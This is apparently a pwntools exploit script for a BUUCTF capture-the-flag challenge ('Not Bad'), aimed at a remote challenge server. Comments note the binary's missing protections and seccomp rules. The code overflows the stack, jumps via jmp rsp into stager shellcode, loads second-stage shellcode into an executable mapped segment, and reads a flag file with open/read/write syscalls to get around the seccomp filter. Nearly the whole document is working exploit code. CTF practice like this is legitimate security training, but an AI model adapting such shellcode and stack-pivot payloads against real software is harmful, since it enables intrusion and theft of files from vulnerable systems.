from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29730
elfpath = ''
ldpath = ''
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
'''
======================= checksec results ===========================
❯ checksec ./bad
[*] '/home/leo/ctfs/ctfoj/BUUCTF/Pwn/[极客大挑战 2019]Not Bad/bad'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

======================= mmap parameter 'prot' ===========================

#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed.  */
#define PROT_NONE        0x0                /* Page can not be accessed.  */
so mmap(, , 6, ...) means writable & executable

======================= seccomp limitations =============================
seccomp_rule_add(v1, 0x7FFF0000LL, 0LL, 0LL);
seccomp_rule_add(v1, 0x7FFF0000LL, 1LL, 0LL);
seccomp_rule_add(v1, 0x7FFF0000LL, 2LL, 0LL);
seccomp_rule_add(v1, 0x7FFF0000LL, 60LL, 0LL);

so we can only use read/write/open/exit syscalls :(

learn usage of shellcraft in pwntools:
http://docs.pwntools.com/en/latest/shellcraft/amd64.html
'''

pop_rdi_ret = 0x400b13
pop_rsi_r15_ret = 0x400b11
syscall = 0x400a0e
jmp_rsp = 0x400a01
leave_ret = 0x4009ec
segment = 0x123000

context.os = 'Linux'
# shellcode = asm(shellcraft.sh())

payload1 = asm(shellcraft.read(0, segment, 0x100))
payload1 += asm("mov rax, 0x123000;call rax")
payload1 = payload1.ljust(0x28, b'\x00')
payload1 += p64(jmp_rsp)
payload1 += asm("sub rsp, 0x30; jmp rsp")
# print(payload1)
ru(b'Easy shellcode, have fun!\n')
s(payload1)

shellcode = shellcraft.open('/flag') # file desciptor: 3
shellcode += shellcraft.read(3, segment+0x100, 0x50)
shellcode += shellcraft.write(1, segment+0x100, 0x50)
payload2 = asm(shellcode)
s(payload2)

shell()


